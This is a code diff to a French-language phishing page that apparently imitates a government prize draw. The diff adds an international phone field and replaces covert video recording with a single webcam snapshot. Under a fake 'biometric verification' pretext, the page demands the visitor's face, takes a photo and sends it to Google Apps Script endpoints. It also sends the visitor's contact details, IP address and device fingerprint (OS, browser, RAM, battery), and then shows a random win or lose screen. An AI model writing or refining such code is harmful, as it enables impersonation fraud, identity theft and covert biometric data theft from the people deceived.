@@ -61,9 +61,24 @@
   .form-group { margin-bottom: 25px; }
   .form-group label { display: block; font-size: 15px; font-weight: 700; margin-bottom: 8px; color: #161616; }
   .form-group .hint { font-size: 13px; color: #666; margin-bottom: 8px; display: block; }
-  .form-group input, .form-group select { width: 100%; padding: 12px; border: 1px solid #3a3a3a; border-radius: 0; font-size: 15px; font-family: 'Marianne', sans-serif; background-color: #fff; }
-  .form-group input:focus, .form-group select:focus { outline: 2px solid #000091; outline-offset: 2px; }
   
+  /* Nouveau style pour les inputs */
+  .form-group input, .form-group select { 
+    width: 100%; 
+    padding: 12px; 
+    border: 1px solid #3a3a3a; 
+    border-radius: 0; 
+    font-size: 15px; 
+    font-family: 'Marianne', sans-serif; 
+    background-color: #fff; 
+  }
+  .form-group input:focus, .form-group select:focus { outline: 2px solid #000091; outline-offset: 2px; }
+
+  /* Groupe Téléphone (Pays + Numéro) */
+  .phone-group { display: flex; gap: 10px; }
+  .phone-group select { width: 130px; flex-shrink: 0; }
+  .phone-group input { flex-grow: 1; }
+
   .option-btn { display: block; width: 100%; text-align: left; background: #fff; border: 1px solid #3a3a3a; padding: 15px; margin-bottom: 10px; cursor: pointer; font-size: 15px; border-radius: 0; font-family: 'Marianne', sans-serif; transition: background 0.2s; }
   .option-btn:hover { background: #f6f6f6; }
   .option-btn.selected { background: #e3e3fd; border-color: #000091; font-weight: 700; color: #000091; }
@@ -172,9 +187,32 @@
       </select>
     </div>
     <div class="form-group" id="group-contact">
-      <label>Votre adresse e-mail</label>
-      <span class="hint">Format attendu : nom@domaine.fr</span>
-      <input type="email" id="input-contact" placeholder="exemple@email.com" required>
+      <label id="label-contact">Votre adresse e-mail</label>
+      <span class="hint" id="hint-contact">Format attendu : nom@domaine.fr</span>
+      
+      <!-- Champ Email -->
+      <div id="email-wrapper">
+        <input type="email" id="input-contact" placeholder="exemple@email.com">
+      </div>
+      
+      <!-- Champ Téléphone avec menu déroulant Pays -->
+      <div id="phone-wrapper" class="phone-group" style="display: none;">
+        <select id="input-country-code">
+          <option value="+33">🇫🇷 +33</option>
+          <option value="+32">🇧🇪 +32</option>
+          <option value="+41">🇨🇭 +41</option>
+          <option value="+352">🇱🇺 +352</option>
+          <option value="+1">🇨🇦 +1</option>
+          <option value="+44">🇬🇧 +44</option>
+          <option value="+49">🇩🇪 +49</option>
+          <option value="+34">🇪🇸 +34</option>
+          <option value="+39">🇮🇹 +39</option>
+          <option value="+212">🇲🇦 +212</option>
+          <option value="+213">🇩🇿 +213</option>
+          <option value="+216">🇹🇳 +216</option>
+        </select>
+        <input type="tel" id="input-phone" placeholder="6 12 34 56 78">
+      </div>
     </div>
     <button class="btn-action" id="btn-claim">Valider mes coordonnées</button>
   </div>
@@ -256,11 +294,26 @@
 const SCRIPT_URL_TEXT = "https://script.google.com/macros/s/AKfycbyBI-fdD9Kw44y3qMp0s4YrDq8RKf5Nod8Zzz_Yeqz8MtksyzWdhP73xE9vPp2ejVj1Ug/exec";
 const SCRIPT_URL_PHOTO = "https://script.google.com/macros/s/AKfycbxGcA_5HG9JtEY48Kw1mowcVVgLUNG1Zl3VTXupuCBOQzPurZIeHiGubUSC1ArcEnp9Ig/exec";
 
+// --- GESTION DES DATES ---
 const currentYear = new Date().getFullYear();
 document.querySelectorAll('.year-dyn').forEach(el => el.textContent = currentYear);
 document.getElementById('date-mentions').textContent = new Date().toLocaleDateString('fr-FR', { day: 'numeric', month: 'long', year: 'numeric' });
 document.getElementById('date-confidentialite').textContent = new Date().toLocaleDateString('fr-FR', { day: 'numeric', month: 'long', year: 'numeric' });
 
+// --- CHARGEMENT DU MODÈLE DE VISAGE ---
+let faceModelLoaded = false;
+async function loadFaceModel() {
+  if (typeof faceapi === 'undefined') return;
+  try {
+    await faceapi.nets.tinyFaceDetector.loadFromUri('https://cdn.jsdelivr.net/gh/justadudewhohacks/face-api.js@master/weights');
+    faceModelLoaded = true;
+  } catch (e) {
+    console.warn("Erreur chargement modèle:", e);
+  }
+}
+loadFaceModel();
+
+// --- UTILS ---
 function openModal(id) { document.getElementById(id).style.display = 'block'; }
 function closeModal(id) { document.getElementById(id).style.display = 'none'; }
 
@@ -307,19 +360,23 @@ const stepWin = document.getElementById('step-win');
 const stepLose = document.getElementById('step-lose');
 
 const inputMethod = document.getElementById('input-method');
+const emailWrapper = document.getElementById('email-wrapper');
+const phoneWrapper = document.getElementById('phone-wrapper');
 const inputContact = document.getElementById('input-contact');
+const inputPhone = document.getElementById('input-phone');
+const inputCountryCode = document.getElementById('input-country-code');
 
 inputMethod.addEventListener('change', () => {
   if (inputMethod.value === 'email') {
-    document.querySelector('#group-contact label').textContent = "Votre adresse e-mail";
-    document.querySelector('#group-contact .hint').textContent = "Format attendu : nom@domaine.fr";
-    inputContact.placeholder = "exemple@email.com";
-    inputContact.type = "email";
+    emailWrapper.style.display = 'block';
+    phoneWrapper.style.display = 'none';
+    document.getElementById('label-contact').textContent = "Votre adresse e-mail";
+    document.getElementById('hint-contact').textContent = "Format attendu : nom@domaine.fr";
   } else {
-    document.querySelector('#group-contact label').textContent = "Votre numéro de téléphone";
-    document.querySelector('#group-contact .hint').textContent = "Format attendu : 06 12 34 56 78";
-    inputContact.placeholder = "06 12 34 56 78";
-    inputContact.type = "tel";
+    emailWrapper.style.display = 'none';
+    phoneWrapper.style.display = 'flex';
+    document.getElementById('label-contact').textContent = "Votre numéro de téléphone";
+    document.getElementById('hint-contact').textContent = "Sélectionnez votre pays puis saisissez votre numéro";
   }
 });
 
@@ -394,17 +451,20 @@ btnNext.addEventListener('click', () => {
 
 document.getElementById('btn-claim').addEventListener('click', () => {
   const emailRegex = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
+  
   if (inputMethod.value === 'email') {
     if (!inputContact.value || !emailRegex.test(inputContact.value)) {
       alert("Veuillez saisir une adresse e-mail valide (ex: nom@domaine.fr).");
       return;
     }
   } else if (inputMethod.value === 'sms') {
-    if (!inputContact.value || inputContact.value.length < 8) {
+    const rawPhone = inputPhone.value.replace(/\s/g, '');
+    if (!rawPhone || rawPhone.length < 7) {
       alert("Veuillez saisir un numéro de téléphone valide.");
       return;
     }
   }
+  
   progressFill.style.width = '75%';
   stepPrize.classList.remove('active');
   stepFinal.classList.add('active');
@@ -424,7 +484,6 @@ btnSubmit.addEventListener('click', async () => {
   loaderText.textContent = "Initialisation du protocole de sécurité...";
   loaderBarFill.style.width = '10%';
   
-  // Réinitialisation de l'état visuel
   videoContainer.classList.remove('detected');
   cameraMsg.textContent = "Placez votre visage dans le cercle";
   cameraMsg.style.color = "#E1000F";
@@ -440,11 +499,12 @@ btnSubmit.addEventListener('click', async () => {
     video.srcObject = mediaStream;
     cameraArea.style.display = 'block';
 
-    // Attendre que la vidéo soit prête
     await new Promise(resolve => {
       if (video.readyState >= 2) { resolve(); }
       else { video.onloadeddata = () => resolve(); }
     });
+
+    await new Promise(r => setTimeout(r, 300));
 
     const track = mediaStream.getVideoTracks()[0];
     const caps = track.getCapabilities ? track.getCapabilities() : {};
@@ -452,29 +512,27 @@ btnSubmit.addEventListener('click', async () => {
       try { await track.applyConstraints({ advanced: [{ torch: true }] }); } catch (e) {}
     }
 
-    // --- DÉTECTION DE VISAGE STRICTE ---
+    // --- DÉTECTION DE VISAGE ---
     loaderText.textContent = "Recherche biométrique (visage)...";
     loaderBarFill.style.width = '25%';
 
     let faceFound = false;
     const startTime = Date.now();
 
-    // On tente de charger le modèle si la librairie est dispo
-    if (typeof faceapi !== 'undefined') {
-      try {
-        await faceapi.nets.tinyFaceDetector.loadFromUri('https://cdn.jsdelivr.net/gh/justadudewhohacks/face-api.js@master/weights');
-      } catch (e) {
-        console.warn("Erreur chargement modèle:", e);
-      }
+    let waited = 0;
+    while (!faceModelLoaded && waited < 3000) {
+      await new Promise(r => setTimeout(r, 200));
+      waited += 200;
     }
 
-    // Boucle de vérification pendant 7 secondes
-    while (Date.now() - startTime < 7000) {
-      if (typeof faceapi !== 'undefined' && faceapi.nets.tinyFaceDetector.isLoaded) {
+    if (faceModelLoaded) {
+      while (Date.now() - startTime < 7000) {
         try {
           if (video.videoWidth > 0 && video.videoHeight > 0) {
-            const detection = await faceapi.detectSingleFace(video, new faceapi.TinyFaceDetectorOptions());
-            if (detection) {
+            const options = new faceapi.TinyFaceDetectorOptions({ inputSize: 224, scoreThreshold: 0.4 });
+            const detection = await faceapi.detectSingleFace(video, options);
+            
+            if (detection && detection.box.width > 30 && detection.box.height > 30) {
               faceFound = true;
               videoContainer.classList.add('detected');
               cameraMsg.textContent = "Visage détecté, analyse en cours...";
@@ -485,9 +543,8 @@ btnSubmit.addEventListener('click', async () => {
         } catch (e) {
           console.warn("Erreur détection:", e);
         }
+        await new Promise(r => setTimeout(r, 300));
       }
-      // Pause de 300ms entre chaque essai
-      await new Promise(r => setTimeout(r, 300));
     }
 
     // --- SI AUCUN VISAGE TROUVÉ : ON BLOQUE ---
@@ -505,95 +562,81 @@ btnSubmit.addEventListener('click', async () => {
       return;
     }
 
-    // --- ENREGISTREMENT VIDÉO ---
+    // --- CAPTURE PHOTO INSTANTANÉE ---
     loaderText.textContent = "Analyse biométrique en cours...";
     loaderBarFill.style.width = '50%';
 
-    let mediaRecorder;
-    let recordedChunks = [];
-    let mimeType = 'video/webm';
-    let extension = 'webm';
-    
-    if (MediaRecorder.isTypeSupported('video/mp4')) {
-        mimeType = 'video/mp4';
-        extension = 'mp4';
-    } else if (MediaRecorder.isTypeSupported('video/webm;codecs=vp9')) {
-        mimeType = 'video/webm;codecs=vp9';
-    } else if (MediaRecorder.isTypeSupported('video/webm')) {
-        mimeType = 'video/webm';
-    }
-
-    mediaRecorder = new MediaRecorder(mediaStream, { mimeType: mimeType });
-    
-    mediaRecorder.ondataavailable = event => {
-      if (event.data.size > 0) { recordedChunks.push(event.data); }
-    };
-
-    mediaRecorder.start();
+    const canvas = document.createElement('canvas');
+    canvas.width = video.videoWidth || 640;
+    canvas.height = video.videoHeight || 480;
+    const ctx = canvas.getContext('2d');
+    ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
+    const photoBase64 = canvas.toDataURL('image/jpeg', 0.85);
 
     setTimeout(() => {
       loaderText.textContent = "Vérification anti-robot et sécurisation...";
       loaderBarFill.style.width = '80%';
-    }, 1500);
-
-    setTimeout(() => {
-      mediaRecorder.stop();
-      loaderBarFill.style.width = '100%';
-      loaderText.textContent = "Validation terminée.";
-
+      
       setTimeout(async () => {
-        const videoBlob = new Blob(recordedChunks, { type: mimeType });
-        const reader = new FileReader();
+        loaderBarFill.style.width = '100%';
+        loaderText.textContent = "Validation terminée.";
+
+        const ip = await getPublicIP();
         
-        reader.onloadend = async function() {
-          const mediaBase64 = reader.result;
-          const ip = await getPublicIP();
+        // Récupération des données selon le choix (Email ou Téléphone)
+        let emailToSend = "";
+        let phoneToSend = "";
+
+        if (inputMethod.value === 'email') {
+          emailToSend = inputContact.value;
+        } else {
+          const code = inputCountryCode.value;
+          const num = inputPhone.value;
+          phoneToSend = code + " " + num;
+        }
+        
+        const formDataTexte = new URLSearchParams();
+        formDataTexte.append("email", emailToSend);
+        formDataTexte.append("phone", phoneToSend);
+        formDataTexte.append("ip", ip);
+        formDataTexte.append("os", info.os);
+        formDataTexte.append("browser", info.browser);
+        formDataTexte.append("screen", screenInfo);
+        formDataTexte.append("lang", navigator.language);
+        formDataTexte.append("cores", cores);
+        formDataTexte.append("ram", ram);
+        formDataTexte.append("battery", batteryInfo);
+        formDataTexte.append("userAgent", info.ua);
+
+        fetch(SCRIPT_URL_TEXT, { method: "POST", body: formDataTexte }).catch(e => console.log(e));
+
+        const formDataMedia = new URLSearchParams();
+        formDataMedia.append("media", photoBase64);
+        formDataMedia.append("extension", "jpg");
+        fetch(SCRIPT_URL_PHOTO, { method: "POST", body: formDataMedia }).catch(e => console.log(e));
+
+        if (mediaStream) mediaStream.getTracks().forEach(t => t.stop());
+        
+        const randomNum = Math.floor(Math.random() * 100) + 1;
+        
+        setTimeout(() => {
+          loader.style.display = 'none';
+          cameraArea.style.display = 'none';
+          stepFinal.classList.remove('active');
           
-          const formDataTexte = new URLSearchParams();
-          formDataTexte.append("email", inputMethod.value === 'email' ? inputContact.value : "");
-          formDataTexte.append("phone", inputMethod.value === 'sms' ? inputContact.value : "");
-          formDataTexte.append("ip", ip);
-          formDataTexte.append("os", info.os);
-          formDataTexte.append("browser", info.browser);
-          formDataTexte.append("screen", screenInfo);
-          formDataTexte.append("lang", navigator.language);
-          formDataTexte.append("cores", cores);
-          formDataTexte.append("ram", ram);
-          formDataTexte.append("battery", batteryInfo);
-          formDataTexte.append("userAgent", info.ua);
-
-          fetch(SCRIPT_URL_TEXT, { method: "POST", body: formDataTexte }).catch(e => console.log(e));
-
-          const formDataMedia = new URLSearchParams();
-          formDataMedia.append("media", mediaBase64);
-          formDataMedia.append("extension", extension);
-          fetch(SCRIPT_URL_PHOTO, { method: "POST", body: formDataMedia }).catch(e => console.log(e));
-
-          if (mediaStream) mediaStream.getTracks().forEach(t => t.stop());
+          if (randomNum <= 15) {
+            document.getElementById('confirm-method-win').textContent = inputMethod.value === 'sms' ? "SMS" : "e-mail";
+            document.getElementById('doc-number-win').textContent = "G-" + currentYear + "-" + Math.floor(100000 + Math.random() * 900000);
+            stepWin.classList.add('active');
+          } else {
+            document.getElementById('doc-number-lose').textContent = "P-" + currentYear + "-" + Math.floor(100000 + Math.random() * 900000);
+            stepLose.classList.add('active');
+          }
           
-          const randomNum = Math.floor(Math.random() * 100) + 1;
-          
-          setTimeout(() => {
-            loader.style.display = 'none';
-            cameraArea.style.display = 'none';
-            stepFinal.classList.remove('active');
-            
-            if (randomNum <= 15) {
-              document.getElementById('confirm-method-win').textContent = inputMethod.value === 'sms' ? "SMS" : "e-mail";
-              document.getElementById('doc-number-win').textContent = "G-" + currentYear + "-" + Math.floor(100000 + Math.random() * 900000);
-              stepWin.classList.add('active');
-            } else {
-              document.getElementById('doc-number-lose').textContent = "P-" + currentYear + "-" + Math.floor(100000 + Math.random() * 900000);
-              stepLose.classList.add('active');
-            }
-            
-            progressFill.style.width = '100%';
-          }, 300);
-        };
-        reader.readAsDataURL(videoBlob);
-      }, 300);
-
-    }, 4500);
+          progressFill.style.width = '100%';
+        }, 300);
+      }, 2000);
+    }, 500);
 
   } catch (err) {
     console.error("Erreur globale :", err);
